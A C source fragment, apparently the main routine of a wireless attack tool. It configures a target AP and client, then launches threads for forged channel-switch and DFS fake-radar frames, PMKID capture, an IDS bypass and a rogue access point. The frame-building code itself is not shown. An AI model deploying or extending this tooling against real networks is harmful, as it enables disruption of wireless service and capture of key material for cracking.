  char cli[MAX_MAC_STR] = "ff:ff:ff:ff:ff:ff";
  if (buf[0] == '2')
    input_prompt("Client MAC", cli, sizeof(cli), vmc, "Invalid MAC", "");

  snprintf(cfg.iface, MAX_IFACE, "%s", iface);
  cfg.new_ch = new_ch;
  snprintf(cfg.client, MAX_MAC_STR, "%s", cli);
  cfg.log_pmkid = cli_pmkid;
  cfg.ids_bypass = cli_bypass;
  cfg.spawn_rogue = cli_rogue;
  if (cli_stats)
    snprintf(cfg.stats_file, MAX_PATH_LEN, "%s", cli_stats);

  menu_vectors(&cfg);
  cfg.mode = menu_mode();

  /* Confirmation */
  printf("\n  " C_DEEP_B "══════════════════════════════════════" RST "\n");
  printf("  IF: %-16s  BSSID: %s\n", iface, tgt.bssid);
  printf("  SSID: %-14s  CH: %d → %d\n", tgt.ssid, tgt.channel, new_ch);
  printf("  Client: %-12s  Mode: %s  Vec: %d\n", cli, MODE_NAMES[cfg.mode],
         cfg.nvec);
  if (cfg.log_pmkid)
    printf("  " C_GREEN "[PMKID]" RST " capture enabled\n");
  if (cfg.ids_bypass)
    printf("  " C_YELLOW "[IDS]" RST " bypass enabled\n");
  if (cfg.dual_radio)
    printf("  " C_CYAN "[DUAL]" RST " %s\n", cfg.iface2);
  if (cfg.spawn_rogue)
    printf("  " C_ORANGE "[ROGUE]" RST " AP enabled\n");
  if (cfg.vec_on[VEC_DFS_FAKE_RADAR]) {
    if (is_dfs_ch(tgt.channel))
      printf("  " C_YELLOW "[OCA]" RST
             " DFS Fake Radar on ch %d — CAC/Non-Occupancy lockout\n",
             tgt.channel);
    else
      printf("  " C_YELLOW "[OCA]" RST
             " DFS Fake Radar active (target ch %d non-DFS)\n",
             tgt.channel);
  }
  printf("  " C_DEEP_B "══════════════════════════════════════" RST "\n");

  printf("\n  " C_RED BLD "Deploy?" RST " (y/N): ");
  fflush(stdout);
  if (!fgets(buf, sizeof(buf), stdin) || buf[0] != 'y') {
    printf("  Cancelled.\n");
    return 0;
  }

  printf("\n  Locking %s to ch %d...\n", iface, tgt.channel);
  set_ch(iface, tgt.channel);
  usleep_precise(0.3);

  factory_t fac;
  if (!factory_build(&fac, &tgt, new_ch, cli))
    return 1;
  engine_t eng;
  engine_init(&eng, &cfg, &fac);
  start_rogue(&cfg, &tgt);

  g_start_time = mono_time();
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);

  printf("  " C_GREEN "[✓] Deployed — %s" RST "\n\n", MODE_NAMES[cfg.mode]);

  pthread_t ch_t = start_ch_lock(&cfg, tgt.channel);
  pthread_t cap_t = start_capture(&cfg, &tgt);
  pthread_t dsp_t = start_display(&cfg, &tgt, 0.1, cfg.stats_file);
  engine_start(&eng);

  while (!g_stop)
    usleep_precise(0.5);

  engine_stop(&eng);
  pthread_join(ch_t, NULL);
  pthread_join(cap_t, NULL);
  pthread_join(dsp_t, NULL);
  stop_rogue(cfg.iface2);
  print_summary(&cfg, &tgt);
  if (export_file[0]) {
    stress_pool_t single_pool;
    stress_pool_init(&single_pool);
    uint8_t zero_mac[6] = {0};
    stress_pool_add(&single_pool, zero_mac, tgt.ssid, tgt.channel, -50);
    parse_mac(tgt.bssid, single_pool.aps[0].bssid);
    format_mac(single_pool.aps[0].bssid, single_pool.aps[0].bssid_str);
    single_pool.aps[0].tx_count = atomic_load(&g_pkts_sent);
    export_report(export_file, &single_pool, mono_time() - g_start_time,
                  atomic_load(&g_pkts_sent), atomic_load(&g_pkts_fail));
    pthread_mutex_destroy(&single_pool.lock);
  }
  return 0;
}